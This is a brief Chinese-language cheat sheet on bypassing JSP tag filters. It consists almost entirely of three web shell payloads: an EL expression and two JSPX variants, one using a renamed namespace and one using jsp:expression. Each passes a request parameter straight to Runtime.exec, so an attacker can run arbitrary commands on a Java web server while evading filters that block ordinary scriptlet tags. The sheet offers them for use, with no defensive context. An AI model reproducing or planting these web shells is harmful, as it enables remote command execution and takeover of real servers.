# jsp标签绕过

## el表达式

```
${Runtime.getRuntime().exec(param.cmd)}
```

## jspx利用命名空间绕过

```jsp
<bbb:root xmlns:bbb="http://java.sun.com/JSP/Page" version="1.2">
<bbb:scriptlet>
 Runtime.getRuntime().exec(request.getParameter('cmd'))   
 </bbb:scriptlet>
</bbb:root>
```

## jspx利用<jsp:expression>绕过

```jsp
<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="1.2">
<jsp:expression>
 Runtime.getRuntime().exec(request.getParameter('cmd'))   
 </jsp:expression>
</jsp:root>
```
